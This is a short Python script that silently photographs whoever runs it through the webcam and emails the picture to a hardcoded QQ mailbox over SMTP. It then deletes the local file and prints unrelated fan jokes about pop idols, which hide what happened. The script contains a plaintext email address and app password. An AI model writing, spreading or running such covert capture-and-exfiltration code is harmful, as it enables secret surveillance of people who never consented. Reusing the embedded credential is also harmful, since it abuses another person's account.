import cv2
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import os

# 调用摄像头拍摄照片
def take_photo():
    camera = cv2.VideoCapture(0)
    return_value, image = camera.read()
    cv2.imwrite('photo.jpg', image)
    del(camera)

# 发送邮件
def send_email():
    from_addr = '1543807401@qq.com'
    to_addr = '1543807401@qq.com'
    password = 'kzvygetazsaqijfj'

    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = '拍摄的照片'

    # 添加图片附件
    image_path = 'photo.jpg'  # 拍摄的照片保存路径
    if os.path.exists(image_path):
        with open(image_path, 'rb') as fp:
            img = MIMEImage(fp.read(), _subtype='jpeg')  # 指定附件类型为jpeg
            img.add_header('Content-Disposition', 'attachment', filename=os.path.basename(image_path))
            msg.attach(img)
    else:
        print('图片文件不存在')

    try:
        server = smtplib.SMTP_SSL('smtp.qq.com', 465)  # 使用QQ邮箱的SMTP服务器，并指定SSL加密
        server.login(from_addr, password)
        server.sendmail(from_addr, to_addr, msg.as_string())
        server.quit()
        print('马+奇把空调外机放他爸妈房间')

        # 邮件发送成功后，删除本地照片
        if os.path.exists('photo.jpg'):
            os.remove('photo.jpg')
            print('我要吃马+奇肌肉线条')
        else:
            print('我们喜欢马+奇')
    except Exception as e:
        print('马+奇，丁程鑫，宋亚轩', e)

# 调用拍照函数并发送邮件
take_photo()
send_email()
print("我是马夫")
input("请问你是谁：")
